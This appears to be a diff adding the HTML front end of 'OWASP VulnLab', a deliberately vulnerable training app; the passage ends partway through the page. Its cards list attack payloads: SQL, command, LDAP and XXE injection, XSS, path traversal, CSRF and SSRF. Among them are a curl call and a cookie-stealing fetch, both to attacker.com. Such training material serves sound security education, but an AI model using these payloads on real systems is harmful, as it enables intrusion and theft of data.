@@ -1,0 +1,1834 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>OWASP VulnLab - Complete Security Testing Platform</title>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+        
+        body {
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+            background: #0f0f23;
+            color: #e0e0e0;
+            min-height: 100vh;
+        }
+        
+        .warning-banner {
+            background: linear-gradient(135deg, #ff0000, #cc0000);
+            color: white;
+            padding: 15px;
+            text-align: center;
+            font-weight: bold;
+            position: sticky;
+            top: 0;
+            z-index: 1000;
+            box-shadow: 0 4px 6px rgba(0,0,0,0.3);
+        }
+        
+        .header {
+            background: linear-gradient(135deg, #1a1a2e, #16213e);
+            padding: 30px 20px;
+            text-align: center;
+            border-bottom: 3px solid #00ff88;
+        }
+        
+        .header h1 {
+            font-size: 2.5em;
+            color: #00ff88;
+            margin-bottom: 10px;
+            text-shadow: 0 0 20px rgba(0,255,136,0.5);
+        }
+        
+        .header p {
+            color: #888;
+            font-size: 1.1em;
+        }
+        
+        .nav-tabs {
+            background: #1a1a2e;
+            display: flex;
+            justify-content: center;
+            flex-wrap: wrap;
+            padding: 10px;
+            border-bottom: 2px solid #333;
+            position: sticky;
+            top: 0;
+            z-index: 999;
+        }
+        
+        .nav-tab {
+            padding: 12px 20px;
+            margin: 5px;
+            background: #16213e;
+            border: 2px solid #00ff88;
+            color: #00ff88;
+            cursor: pointer;
+            border-radius: 5px;
+            transition: all 0.3s;
+            font-weight: 600;
+            font-size: 13px;
+        }
+        
+        .nav-tab:hover {
+            background: #00ff88;
+            color: #0f0f23;
+            transform: translateY(-2px);
+        }
+        
+        .nav-tab.active {
+            background: #00ff88;
+            color: #0f0f23;
+        }
+        
+        .container {
+            max-width: 1400px;
+            margin: 0 auto;
+            padding: 20px;
+        }
+        
+        .section {
+            display: none;
+        }
+        
+        .section.active {
+            display: block;
+        }
+        
+        .grid {
+            display: grid;
+            grid-template-columns: repeat(auto-fit, minmax(400px, 1fr));
+            gap: 20px;
+            margin-bottom: 30px;
+        }
+        
+        .card {
+            background: linear-gradient(135deg, #1a1a2e, #16213e);
+            padding: 25px;
+            border-radius: 10px;
+            border: 2px solid #333;
+            box-shadow: 0 10px 30px rgba(0,0,0,0.5);
+            transition: all 0.3s;
+        }
+        
+        .card:hover {
+            border-color: #00ff88;
+            box-shadow: 0 10px 40px rgba(0,255,136,0.2);
+        }
+        
+        .card-header {
+            display: flex;
+            align-items: center;
+            margin-bottom: 15px;
+            padding-bottom: 15px;
+            border-bottom: 2px solid #333;
+        }
+        
+        .card-icon {
+            font-size: 2em;
+            margin-right: 15px;
+        }
+        
+        .card-title {
+            flex: 1;
+        }
+        
+        .card-title h3 {
+            color: #00ff88;
+            font-size: 1.3em;
+            margin-bottom: 5px;
+        }
+        
+        .card-title .severity {
+            display: inline-block;
+            padding: 3px 10px;
+            border-radius: 3px;
+            font-size: 0.8em;
+            font-weight: bold;
+        }
+        
+        .severity.critical { background: #ff0000; color: white; }
+        .severity.high { background: #ff6600; color: white; }
+        .severity.medium { background: #ffaa00; color: black; }
+        .severity.low { background: #00aaff; color: white; }
+        
+        .form-group {
+            margin-bottom: 15px;
+        }
+        
+        label {
+            display: block;
+            margin-bottom: 5px;
+            color: #00ff88;
+            font-weight: 500;
+            font-size: 14px;
+        }
+        
+        input[type="text"],
+        input[type="password"],
+        input[type="email"],
+        input[type="number"],
+        input[type="url"],
+        input[type="file"],
+        select,
+        textarea {
+            width: 100%;
+            padding: 10px;
+            background: #0f0f23;
+            border: 2px solid #333;
+            border-radius: 5px;
+            color: #e0e0e0;
+            font-size: 14px;
+            transition: all 0.3s;
+        }
+        
+        input:focus, select:focus, textarea:focus {
+            outline: none;
+            border-color: #00ff88;
+            box-shadow: 0 0 10px rgba(0,255,136,0.3);
+        }
+        
+        textarea {
+            resize: vertical;
+            min-height: 100px;
+            font-family: 'Courier New', monospace;
+        }
+        
+        button {
+            width: 100%;
+            padding: 12px;
+            background: linear-gradient(135deg, #00ff88, #00cc6a);
+            color: #0f0f23;
+            border: none;
+            border-radius: 5px;
+            font-size: 15px;
+            font-weight: 700;
+            cursor: pointer;
+            transition: all 0.3s;
+            text-transform: uppercase;
+        }
+        
+        button:hover {
+            transform: translateY(-2px);
+            box-shadow: 0 5px 20px rgba(0,255,136,0.4);
+        }
+        
+        .result {
+            margin-top: 15px;
+            padding: 15px;
+            border-radius: 5px;
+            display: none;
+            font-size: 13px;
+            border-left: 4px solid;
+        }
+        
+        .result.success {
+            background: rgba(0,255,136,0.1);
+            color: #00ff88;
+            border-color: #00ff88;
+        }
+        
+        .result.error {
+            background: rgba(255,0,0,0.1);
+            color: #ff6666;
+            border-color: #ff0000;
+        }
+        
+        .result.info {
+            background: rgba(0,170,255,0.1);
+            color: #00aaff;
+            border-color: #00aaff;
+        }
+        
+        .vuln-info {
+            margin-top: 15px;
+            padding: 15px;
+            background: rgba(255,170,0,0.1);
+            border-radius: 5px;
+            border: 1px solid #ffaa00;
+            font-size: 12px;
+        }
+        
+        .vuln-info h4 {
+            color: #ffaa00;
+            margin-bottom: 10px;
+            font-size: 14px;
+        }
+        
+        .vuln-info code {
+            background: #0f0f23;
+            padding: 2px 8px;
+            border-radius: 3px;
+            color: #00ff88;
+            font-size: 11px;
+        }
+        
+        .vuln-info ul {
+            margin-left: 15px;
+            color: #ccc;
+        }
+        
+        .vuln-info li {
+            margin-bottom: 5px;
+        }
+        
+        pre {
+            background: #0f0f23;
+            padding: 15px;
+            border-radius: 5px;
+            overflow-x: auto;
+            color: #00ff88;
+            font-size: 12px;
+            border: 1px solid #333;
+        }
+        
+        .comment-box {
+            background: rgba(255,255,255,0.05);
+            padding: 12px;
+            margin-top: 10px;
+            border-radius: 5px;
+            border-left: 3px solid #00ff88;
+        }
+        
+        .comment-box .user {
+            font-weight: 600;
+            color: #00ff88;
+            font-size: 13px;
+        }
+        
+        .comment-box .content {
+            margin-top: 5px;
+            color: #ccc;
+            font-size: 13px;
+        }
+        
+        .session-info {
+            background: rgba(0,255,136,0.1);
+            padding: 10px;
+            border-radius: 5px;
+            margin-bottom: 15px;
+            font-size: 12px;
+            border: 1px solid #00ff88;
+        }
+        
+        .api-response {
+            background: #0f0f23;
+            padding: 10px;
+            border-radius: 5px;
+            margin-top: 10px;
+            font-family: 'Courier New', monospace;
+            font-size: 11px;
+            max-height: 300px;
+            overflow-y: auto;
+        }
+        
+        .file-item {
+            padding: 10px;
+            margin: 5px 0;
+            background: rgba(255,255,255,0.05);
+            border-radius: 5px;
+            border: 1px solid #333;
+            cursor: pointer;
+            transition: all 0.3s;
+        }
+        
+        .file-item:hover {
+            background: rgba(0,255,136,0.1);
+            border-color: #00ff88;
+        }
+        
+        .owasp-badge {
+            display: inline-block;
+            padding: 3px 8px;
+            background: #ff0000;
+            color: white;
+            border-radius: 3px;
+            font-size: 10px;
+            font-weight: bold;
+            margin-left: 10px;
+        }
+        
+        @media (max-width: 768px) {
+            .grid {
+                grid-template-columns: 1fr;
+            }
+            
+            .header h1 {
+                font-size: 1.8em;
+            }
+        }
+    </style>
+</head>
+<body>
+    <div class="warning-banner">
+        ⚠️ EXTREMELY VULNERABLE APPLICATION - FOR EDUCATIONAL/PENTESTING PURPOSES ONLY - DO NOT DEPLOY TO PRODUCTION ⚠️
+    </div>
+    
+    <div class="header">
+        <h1>🛡️ OWASP VulnLab</h1>
+        <p>Complete Vulnerability Testing Platform | OWASP Top 10 & More</p>
+    </div>
+    
+    <div class="nav-tabs">
+        <div class="nav-tab active" onclick="showSection('auth')">🔐 Authentication</div>
+        <div class="nav-tab" onclick="showSection('injection')">💉 Injection Attacks</div>
+        <div class="nav-tab" onclick="showSection('xss')">📝 XSS Variants</div>
+        <div class="nav-tab" onclick="showSection('access')">🔓 Access Control</div>
+        <div class="nav-tab" onclick="showSection('crypto')">🔑 Cryptographic</div>
+        <div class="nav-tab" onclick="showSection('misc')">⚡ Miscellaneous</div>
+    </div>
+    
+    <div class="container">
+        <!-- AUTHENTICATION SECTION -->
+        <div id="auth" class="section active">
+            <div class="grid">
+                <!-- A01: Broken Access Control - Login -->
+                <div class="card">
+                    <div class="card-header">
+                        <div class="card-icon">🔐</div>
+                        <div class="card-title">
+                            <h3>Login System <span class="owasp-badge">A01:2021</span></h3>
+                            <span class="severity critical">CRITICAL</span>
+                        </div>
+                    </div>
+                    
+                    <form id="loginForm">
+                        <div class="form-group">
+                            <label>Username</label>
+                            <input type="text" id="username" required>
+                        </div>
+                        <div class="form-group">
+                            <label>Password</label>
+                            <input type="password" id="password" required>
+                        </div>
+                        <button type="submit">Login</button>
+                    </form>
+                    
+                    <div class="result" id="loginResult"></div>
+                    
+                    <div class="vuln-info">
+                        <h4>🔓 Vulnerabilities:</h4>
+                        <ul>
+                            <li>SQL Injection: <code>' OR '1'='1' --</code></li>
+                            <li>XSS: <code>&lt;script&gt;alert('XSS')&lt;/script&gt;</code></li>
+                            <li>Default creds: <code>ardx123 / ardx1234</code></li>
+                            <li>No rate limiting</li>
+                            <li>Client-side validation only</li>
+                        </ul>
+                    </div>
+                </div>
+
+                <!-- Session Management -->
+                <div class="card">
+                    <div class="card-header">
+                        <div class="card-icon">🎫</div>
+                        <div class="card-title">
+                            <h3>Session Manager <span class="owasp-badge">A07:2021</span></h3>
+                            <span class="severity high">HIGH</span>
+                        </div>
+                    </div>
+                    
+                    <div class="session-info" id="sessionInfo">
+                        <strong>Current Session:</strong><br>
+                        Session ID: <code id="sessionId">Not logged in</code><br>
+                        User: <code id="sessionUser">Guest</code><br>
+                        Role: <code id="sessionRole">none</code>
+                    </div>
+                    
+                    <button onclick="fixSession()">Fix Session (Exploit)</button>
+                    <button onclick="viewAllSessions()" style="margin-top: 10px;">View All Sessions (IDOR)</button>
+                    
+                    <div class="result" id="sessionResult"></div>
+                    
+                    <div class="vuln-info">
+                        <h4>🔓 Vulnerabilities:</h4>
+                        <ul>
+                            <li>Session fixation</li>
+                            <li>Predictable session IDs</li>
+                            <li>No session timeout</li>
+                            <li>IDOR: View other users' sessions</li>
+                            <li>Session stored in URL/visible</li>
+                        </ul>
+                    </div>
+                </div>
+
+                <!-- Password Reset -->
+                <div class="card">
+                    <div class="card-header">
+                        <div class="card-icon">🔄</div>
+                        <div class="card-title">
+                            <h3>Password Reset <span class="owasp-badge">A01:2021</span></h3>
+                            <span class="severity high">HIGH</span>
+                        </div>
+                    </div>
+                    
+                    <form id="resetForm">
+                        <div class="form-group">
+                            <label>Email or User ID</label>
+                            <input type="text" id="resetEmail" placeholder="user@example.com or user_id=123" required>
+                        </div>
+                        <button type="submit">Request Reset</button>
+                    </form>
+                    
+                    <div class="result" id="resetResult"></div>
+                    
+                    <div class="vuln-info">
+                        <h4>🔓 Vulnerabilities:</h4>
+                        <ul>
+                            <li>IDOR: Reset any user's password</li>
+                            <li>Try: <code>user_id=1</code>, <code>admin@site.com</code></li>
+                            <li>Predictable reset tokens</li>
+                            <li>No email verification</li>
+                            <li>Token exposed in URL</li>
+                        </ul>
+                    </div>
+                </div>
+            </div>
+        </div>
+
+        <!-- INJECTION ATTACKS SECTION -->
+        <div id="injection" class="section">
+            <div class="grid">
+                <!-- A03: SQL Injection -->
+                <div class="card">
+                    <div class="card-header">
+                        <div class="card-icon">💉</div>
+                        <div class="card-title">
+                            <h3>User Search (SQLi) <span class="owasp-badge">A03:2021</span></h3>
+                            <span class="severity critical">CRITICAL</span>
+                        </div>
+                    </div>
+                    
+                    <form id="searchForm">
+                        <div class="form-group">
+                            <label>Search User</label>
+                            <input type="text" id="searchQuery" placeholder="Enter username">
+                        </div>
+                        <button type="submit">Search</button>
+                    </form>
+                    
+                    <div class="result" id="searchResult"></div>
+                    
+                    <div class="vuln-info">
+                        <h4>🔓 SQL Injection Payloads:</h4>
+                        <ul>
+                            <li>Union: <code>' UNION SELECT username,password FROM users--</code></li>
+                            <li>Boolean: <code>' OR '1'='1</code></li>
+                            <li>Time-based: <code>' OR SLEEP(5)--</code></li>
+                            <li>Error-based: <code>' AND 1=CONVERT(int,@@version)--</code></li>
+                        </ul>
+                    </div>
+                </div>
+
+                <!-- Command Injection -->
+                <div class="card">
+                    <div class="card-header">
+                        <div class="card-icon">🖥️</div>
+                        <div class="card-title">
+                            <h3>Network Tools (Cmd Injection) <span class="owasp-badge">A03:2021</span></h3>
+                            <span class="severity critical">CRITICAL</span>
+                        </div>
+                    </div>
+                    
+                    <form id="pingForm">
+                        <div class="form-group">
+                            <label>Host to Ping</label>
+                            <input type="text" id="host" placeholder="127.0.0.1">
+                        </div>
+                        <button type="submit">Execute Ping</button>
+                    </form>
+                    
+                    <div class="result" id="pingResult"></div>
+                    
+                    <div class="vuln-info">
+                        <h4>🔓 Command Injection:</h4>
+                        <ul>
+                            <li><code>; ls -la</code></li>
+                            <li><code>| cat /etc/passwd</code></li>
+                            <li><code>& whoami</code></li>
+                            <li><code>`id`</code></li>
+                            <li><code>$(curl http://attacker.com)</code></li>
+                        </ul>
+                    </div>
+                </div>
+
+                <!-- LDAP Injection -->
+                <div class="card">
+                    <div class="card-header">
+                        <div class="card-icon">📋</div>
+                        <div class="card-title">
+                            <h3>LDAP Directory Search <span class="owasp-badge">A03:2021</span></h3>
+                            <span class="severity high">HIGH</span>
+                        </div>
+                    </div>
+                    
+                    <form id="ldapForm">
+                        <div class="form-group">
+                            <label>Employee Name</label>
+                            <input type="text" id="ldapQuery" placeholder="John Doe">
+                        </div>
+                        <button type="submit">Search LDAP</button>
+                    </form>
+                    
+                    <div class="result" id="ldapResult"></div>
+                    
+                    <div class="vuln-info">
+                        <h4>🔓 LDAP Injection:</h4>
+                        <ul>
+                            <li>Bypass: <code>*)(uid=*))(|(uid=*</code></li>
+                            <li>Dump all: <code>*</code></li>
+                            <li>Admin access: <code>admin)(&</code></li>
+                        </ul>
+                    </div>
+                </div>
+
+                <!-- XML External Entity (XXE) -->
+                <div class="card">
+                    <div class="card-header">
+                        <div class="card-icon">📄</div>
+                        <div class="card-title">
+                            <h3>XML Parser (XXE) <span class="owasp-badge">A03:2021</span></h3>
+                            <span class="severity critical">CRITICAL</span>
+                        </div>
+                    </div>
+                    
+                    <form id="xmlForm">
+                        <div class="form-group">
+                            <label>Upload XML Data</label>
+                            <textarea id="xmlData" placeholder="Paste XML here...">&lt;?xml version="1.0"?&gt;
+&lt;user&gt;
+  &lt;name&gt;John&lt;/name&gt;
+  &lt;email&gt;john@example.com&lt;/email&gt;
+&lt;/user&gt;</textarea>
+                        </div>
+                        <button type="submit">Parse XML</button>
+                    </form>
+                    
+                    <div class="result" id="xmlResult"></div>
+                    
+                    <div class="vuln-info">
+                        <h4>🔓 XXE Payloads:</h4>
+                        <ul>
+                            <li>Read file: <code>&lt;!DOCTYPE foo [&lt;!ENTITY xxe SYSTEM "file:///etc/passwd"&gt;]&gt;</code></li>
+                            <li>SSRF: <code>&lt;!ENTITY xxe SYSTEM "http://internal-server/"&gt;</code></li>
+                            <li>Blind XXE with DTD</li>
+                        </ul>
+                    </div>
+                </div>
+            </div>
+        </div>
+
+        <!-- XSS VARIANTS SECTION -->
+        <div id="xss" class="section">
+            <div class="grid">
+                <!-- A03: Reflected XSS -->
+                <div class="card">
+                    <div class="card-header">
+                        <div class="card-icon">🔍</div>
+                        <div class="card-title">
+                            <h3>Search (Reflected XSS) <span class="owasp-badge">A03:2021</span></h3>
+                            <span class="severity high">HIGH</span>
+                        </div>
+                    </div>
+                    
+                    <form id="xssSearchForm">
+                        <div class="form-group">
+                            <label>Search Products</label>
+                            <input type="text" id="xssSearch" placeholder="Enter search term">
+                        </div>
+                        <button type="submit">Search</button>
+                    </form>
+                    
+                    <div class="result" id="xssSearchResult"></div>
+                    
+                    <div class="vuln-info">
+                        <h4>🔓 XSS Payloads:</h4>
+                        <ul>
+                            <li><code>&lt;script&gt;alert('XSS')&lt;/script&gt;</code></li>
+                            <li><code>&lt;img src=x onerror=alert('XSS')&gt;</code></li>
+                            <li><code>&lt;svg onload=alert('XSS')&gt;</code></li>
+                            <li><code>&lt;body onload=alert('XSS')&gt;</code></li>
+                        </ul>
+                    </div>
+                </div>
+
+                <!-- Stored XSS -->
+                <div class="card">
+                    <div class="card-header">
+                        <div class="card-icon">💬</div>
+                        <div class="card-title">
+                            <h3>Comment Board (Stored XSS) <span class="owasp-badge">A03:2021</span></h3>
+                            <span class="severity critical">CRITICAL</span>
+                        </div>
+                    </div>
+                    
+                    <form id="commentForm">
+                        <div class="form-group">
+                            <label>Your Name</label>
+                            <input type="text" id="commentUser" required>
+                        </div>
+                        <div class="form-group">
+                            <label>Comment</label>
+                            <textarea id="commentText" required></textarea>
+                        </div>
+                        <button type="submit">Post Comment</button>
+                    </form>
+                    
+                    <div id="comments"></div>
+                    
+                    <div class="vuln-info">
+                        <h4>🔓 Stored XSS:</h4>
+                        <ul>
+                            <li>Persistent attack</li>
+                            <li>Affects all visitors</li>
+                            <li>Cookie stealing: <code>&lt;script&gt;fetch('http://attacker.com?c='+document.cookie)&lt;/script&gt;</code></li>
+                        </ul>
+                    </div>
+                </div>
+
+                <!-- DOM-based XSS -->
+                <div class="card">
+                    <div class="card-header">
+                        <div class="card-icon">🌐</div>
+                        <div class="card-title">
+                            <h3>Profile Viewer (DOM XSS) <span class="owasp-badge">A03:2021</span></h3>
+                            <span class="severity high">HIGH</span>
+                        </div>
+                    </div>
+                    
+                    <div class="form-group">
+                        <label>User ID (from URL)</label>
+                        <input type="text" id="domUserId" placeholder="Enter user ID">
+                        <button onclick="loadProfile()" style="margin-top: 10px;">Load Profile</button>
+                    </div>
+                    
+                    <div class="result" id="domResult"></div>
+                    
+                    <div class="vuln-info">
+                        <h4>🔓 DOM XSS:</h4>
+                        <ul>
+                            <li>URL: <code>#userId=&lt;img src=x onerror=alert(1)&gt;</code></li>
+                            <li>innerHTML sink</li>
+                            <li>Client-side rendering</li>
+                        </ul>
+                    </div>
+                </div>
+            </div>
+        </div>
+
+        <!-- ACCESS CONTROL SECTION -->
+        <div id="access" class="section">
+            <div class="grid">
+                <!-- IDOR -->
+                <div class="card">
+                    <div class="card-header">
+                        <div class="card-icon">👤</div>
+                        <div class="card-title">
+                            <h3>User Profiles (IDOR) <span class="owasp-badge">A01:2021</span></h3>
+                            <span class="severity high">HIGH</span>
+                        </div>
+                    </div>
+                    
+                    <form id="idorForm">
+                        <div class="form-group">
+                            <label>User ID</label>
+                            <input type="number" id="userId" placeholder="1" min="1" max="100">
+                        </div>
+                        <button type="submit">View Profile</button>
+                    </form>
+                    
+                    <div class="result" id="idorResult"></div>
+                    
+                    <div class="vuln-info">
+                        <h4>🔓 IDOR Exploit:</h4>
+                        <ul>
+                            <li>Try IDs: 1, 2, 3, 10, 99</li>
+                            <li>No authorization checks</li>
+                            <li>Direct object reference</li>
+                            <li>Access other users' data</li>
+                        </ul>
+                    </div>
+                </div>
+
+                <!-- Path Traversal -->
+                <div class="card">
+                    <div class="card-header">
+                        <div class="card-icon">📁</div>
+                        <div class="card-title">
+                            <h3>File Manager (Path Traversal) <span class="owasp-badge">A01:2021</span></h3>
+                            <span class="severity critical">CRITICAL</span>
+                        </div>
+                    </div>
+                    
+                    <div class="file-list">
+                        <div class="file-item" onclick="viewFile('readme.txt')">📄 readme.txt</div>
+                        <div class="file-item" onclick="viewFile('config.json')">⚙️ config.json</div>
+                        <div class="file-item" onclick="viewFile('data.csv')">📊 data.csv</div>
+                    </div>
+                    
+                    <div class="form-group" style="margin-top: 15px;">
+                        <label>Custom Path</label>
+                        <input type="text" id="filename" placeholder="../../etc/passwd">
+                        <button onclick="viewFile(document.getElementById('filename').value)" style="margin-top: 10px;">View File</button>
+                    </div>
+                    
+                    <div class="result" id="fileResult"></div>
+                    
+                    <div class="vuln-info">
+                        <h4>🔓 Path Traversal:</h4>
+                        <ul>
+                            <li><code>../../../etc/passwd</code></li>
+                            <li><code>..\..\..\..\windows\system32\config\sam</code></li>
+                            <li>URL encoding: <code>%2e%2e%2f</code></li>
+                        </ul>
+                    </div>
+                </div>
+
+                <!-- CSRF -->
+                <div class="card">
+                    <div class="card-header">
+                        <div class="card-icon">💸</div>
+                        <div class="card-title">
+                            <h3>Money Transfer (CSRF) <span class="owasp-badge">A01:2021</span></h3>
+                            <span class="severity high">HIGH</span>
+                        </div>
+                    </div>
+                    
+                    <form id="transferForm">
+                        <div class="form-group">
+                            <label>Recipient Account</label>
+                            <input type="text" id="recipient" placeholder="ACC-123456" required>
+                        </div>
+                        <div class="form-group">
+                            <label>Amount ($)</label>
+                            <input type="number" id="amount" placeholder="100.00" required>
+                        </div>
+                        <button type="submit">Transfer Money</button>
+                    </form>
+                    
+                    <div class="result" id="transferResult"></div>
+                    
+                    <div class="vuln-info">
+                        <h4>🔓 CSRF Attack:</h4>
+                        <ul>
+                            <li>No CSRF token</li>
+                            <li>Attack: <code>&lt;img src="transfer?to=attacker&amt=1000"&gt;</code></li>
+                            <li>Form auto-submit exploit</li>
+                        </ul>
+                    </div>
+                </div>
+
+                <!-- Privilege Escalation -->
+                <div class="card">
+                    <div class="card-header">
+                        <div class="card-icon">👑</div>
+                        <div class="card-title">
+                            <h3>Admin Panel (Priv Escalation) <span class="owasp-badge">A01:2021</span></h3>
+                            <span class="severity critical">CRITICAL</span>
+                        </div>
+                    </div>
+                    
+                    <div class="session-info">
+                        Current Role: <code id="currentRole">user</code>
+                    </div>
+                    
+                    <form id="roleForm">
+                        <div class="form-group">
+                            <label>Action</label>
+                            <select id="roleAction">
+                                <option value="view">View Users</option>
+                                <option value="edit">Edit User</option>
+                                <option value="delete">Delete User</option>
+                                <option value="admin">Access Admin Panel</option>
+                            </select>
+                        </div>
+                        <button type="submit">Execute Action</button>
+                    </form>
+                    
+                    <div class="result" id="roleResult"></div>
+                    
+                    <div class="vuln-info">
+                        <h4>🔓 Vulnerabilities:</h4>
+                        <ul>
+                            <li>Missing authorization checks</li>
+                            <li>Role tampering via client</li>
+                            <li>No server-side validation</li>
+                            <li>Try: Modify <code>currentRole</code> to "admin"</li>
+                        </ul>
+                    </div>
+                </div>
+            </div>
+        </div>
+
+        <!-- CRYPTOGRAPHIC SECTION -->
+        <div id="crypto" class="section">
+            <div class="grid">
+                <!-- Weak Encryption -->
+                <div class="card">
+                    <div class="card-header">
+                        <div class="card-icon">🔐</div>
+                        <div class="card-title">
+                            <h3>Data Encryptor <span class="owasp-badge">A02:2021</span></h3>
+                            <span class="severity high">HIGH</span>
+                        </div>
+                    </div>
+                    
+                    <form id="encryptForm">
+                        <div class="form-group">
+                            <label>Sensitive Data</label>
+                            <input type="text" id="encryptData" placeholder="Enter secret data">
+                        </div>
+                        <button type="submit">Encrypt</button>
+                    </form>
+                    
+                    <div class="result" id="encryptResult"></div>
+                    
+                    <div class="vuln-info">
+                        <h4>🔓 Crypto Failures:</h4>
+                        <ul>
+                            <li>Base64 encoding (NOT encryption)</li>
+                            <li>Hardcoded encryption key</li>
+                            <li>Weak algorithm (ROT13)</li>
+                            <li>No salt or IV</li>
+                        </ul>
+                    </div>
+                </div>
+
+                <!-- Weak Hashing -->
+                <div class="card">
+                    <div class="card-header">
+                        <div class="card-icon">🔑</div>
+                        <div class="card-title">
+                            <h3>Password Hasher <span class="owasp-badge">A02:2021</span></h3>
+                            <span class="severity critical">CRITICAL</span>
+                        </div>
+                    </div>
+                    
+                    <form id="hashForm">
+                        <div class="form-group">
+                            <label>Password</label>
+                            <input type="password" id="hashPassword">
+                        </div>
+                        <button type="submit">Generate Hash</button>
+                    </form>
+                    
+                    <div class="result" id="hashResult"></div>
+                    
+                    <div class="vuln-info">
+                        <h4>🔓 Vulnerabilities:</h4>
+                        <ul>
+                            <li>MD5 hashing (broken algorithm)</li>
+                            <li>No salt</li>
+                            <li>Rainbow table attacks</li>
+                            <li>Easily crackable</li>
+                        </ul>
+                    </div>
+                </div>
+
+                <!-- Insecure Deserialization -->
+                <div class="card">
+                    <div class="card-header">
+                        <div class="card-icon">📦</div>
+                        <div class="card-title">
+                            <h3>Session Deserializer <span class="owasp-badge">A08:2021</span></h3>
+                            <span class="severity critical">CRITICAL</span>
+                        </div>
+                    </div>
+                    
+                    <form id="deserializeForm">
+                        <div class="form-group">
+                            <label>Serialized Data</label>
+                            <textarea id="serialData" placeholder='{"user":"admin","role":"user"}'></textarea>
+                        </div>
+                        <button type="submit">Deserialize</button>
+                    </form>
+                    
+                    <div class="result" id="deserializeResult"></div>
+                    
+                    <div class="vuln-info">
+                        <h4>🔓 Deserialization Attack:</h4>
+                        <ul>
+                            <li>Modify: <code>{"user":"admin","role":"admin"}</code></li>
+                            <li>Object injection</li>
+                            <li>No integrity check</li>
+                            <li>RCE possible in real apps</li>
+                        </ul>
+                    </div>
+                </div>
+            </div>
+        </div>
+
+        <!-- MISCELLANEOUS SECTION -->
+        <div id="misc" class="section">
+            <div class="grid">
+                <!-- File Upload -->
+                <div class="card">
+                    <div class="card-header">
+                        <div class="card-icon">📤</div>
+                        <div class="card-title">
+                            <h3>File Upload <span class="owasp-badge">A04:2021</span></h3>
+                            <span class="severity critical">CRITICAL</span>
+                        </div>
+                    </div>
+                    
+                    <form id="uploadForm">
+                        <div class="form-group">
+                            <label>Choose File</label>
+                            <input type="file" id="fileUpload">
+                        </div>
+                        <button type="submit">Upload File</button>
+                    </form>
+                    
+                    <div class="result" id="uploadResult"></div>
+                    
+                    <div class="vuln-info">
+                        <h4>🔓 Upload Vulnerabilities:</h4>
+                        <ul>
+                            <li>No file type validation</li>
+                            <li>Can upload: .php, .exe, .sh</li>
+                            <li>No size limit</li>
+                            <li>Web shell upload possible</li>
+                        </ul>
+                    </div>
+                </div>
+
+                <!-- SSRF -->
+                <div class="card">
+                    <div class="card-header">
+                        <div class="card-icon">🌐</div>
+                        <div class="card-title">
+                            <h3>URL Fetcher (SSRF) <span class="owasp-badge">A10:2021</span></h3>
+                            <span class="severity critical">CRITICAL</span>
+                        </div>
+                    </div>
+                    
+                    <form id="ssrfForm">
+                        <div class="form-group">
+                            <label>URL to Fetch</label>
+                            <input type="url" id="ssrfUrl" placeholder="https://example.com">
+                        </div>
+                        <button type="submit">Fetch URL</button>
+                    </form>
+                    
+                    <div class="result" id="ssrfResult"></div>
+                    
+                    <div class="vuln-info">
+                        <h4>🔓 SSRF Exploits:</h4>
+                        <ul>
+                            <li>Internal: <code>http://localhost:8080/admin</code></li>
+                            <li>Cloud metadata: <code>http://169.254.169.254/latest/meta-data/</code></li>
+                            <li>File: <code>file:///etc/passwd</code></li>
+                            <li>Port scan internal network</li>
+                        </ul>
+                    </div>
+                </div>
+
+                <!-- Security Misconfiguration -->
+                <div class="card">
+                    <div class="card-header">
+                        <div class="card-icon">⚙️</div>
+                        <div class="card-title">
+                            <h3>Debug Console <span class="owasp-badge">A05:2021</span></h3>
+                            <span class="severity high">HIGH</span>
+                        </div>
+                    </div>
+                    
+                    <div class="api-response">
+                        <strong>Server Info (Should be hidden!):</strong><br>
+                        Server: Apache/2.4.41 (Ubuntu)<br>
+                        PHP Version: 7.4.3<br>
+                        MySQL: 8.0.23<br>
+                        Debug Mode: <span style="color:#ff0000">ENABLED</span><br>
+                        Database: mysql://root:password@localhost:3306/webapp<br>
+                        API Keys: sk-1234567890abcdef<br>
+                    </div>
+                    
+                    <button onclick="viewLogs()">View Error Logs</button>
+                    <button onclick="viewConfig()" style="margin-top: 10px;">View Config File</button>
+                    
+                    <div class="result" id="debugResult"></div>
+                    
+                    <div class="vuln-info">
+                        <h4>🔓 Misconfigurations:</h4>
+                        <ul>
+                            <li>Debug mode enabled</li>
+                            <li>Verbose error messages</li>
+                            <li>Exposed credentials</li>
+                            <li>Directory listing enabled</li>
+                        </ul>
+                    </div>
+                </div>
+
+                <!-- Vulnerable Components -->
+                <div class="card">
+                    <div class="card-header">
+                        <div class="card-icon">📚</div>
+                        <div class="card-title">
+                            <h3>Libraries Info <span class="owasp-badge">A06:2021</span></h3>
+                            <span class="severity medium">MEDIUM</span>
+                        </div>
+                    </div>
+                    
+                    <div class="api-response">
+                        <strong>Installed Components:</strong><br>
+                        jQuery 1.8.3 (CVE-2020-11022, CVE-2020-11023)<br>
+                        Bootstrap 3.3.7 (XSS vulnerabilities)<br>
+                        Apache Struts 2.3.34 (RCE - Critical)<br>
+                        OpenSSL 1.0.1 (Heartbleed)<br>
+                        Log4j 2.14.1 (Log4Shell - CVE-2021-44228)<br>
+                    </div>
+                    
+                    <button onclick="scanVulnerabilities()">Scan for CVEs</button>
+                    
+                    <div class="result" id="componentResult"></div>
+                    
+                    <div class="vuln-info">
+                        <h4>🔓 Vulnerable Components:</h4>
+                        <ul>
+                            <li>Outdated libraries</li>
+                            <li>Known CVEs present</li>
+                            <li>No security patches</li>
+                            <li>Exploitable dependencies</li>
+                        </ul>
+                    </div>
+                </div>
+
+                <!-- Information Disclosure -->
+                <div class="card">
+                    <div class="card-header">
+                        <div class="card-icon">🔍</div>
+                        <div class="card-title">
+                            <h3>API Endpoint <span class="owasp-badge">A09:2021</span></h3>
+                            <span class="severity medium">MEDIUM</span>
+                        </div>
+                    </div>
+                    
+                    <form id="apiForm">
+                        <div class="form-group">
+                            <label>API Endpoint</label>
+                            <input type="text" id="apiEndpoint" value="/api/users" readonly>
+                        </div>
+                        <button type="submit">Call API</button>
+                    </form>
+                    
+                    <div class="result" id="apiResult"></div>
+                    
+                    <div class="vuln-info">
+                        <h4>🔓 Info Disclosure:</h4>
+                        <ul>
+                            <li>Excessive data exposure</li>
+                            <li>No authentication required</li>
+                            <li>Sensitive data in response</li>
+                            <li>Stack traces exposed</li>
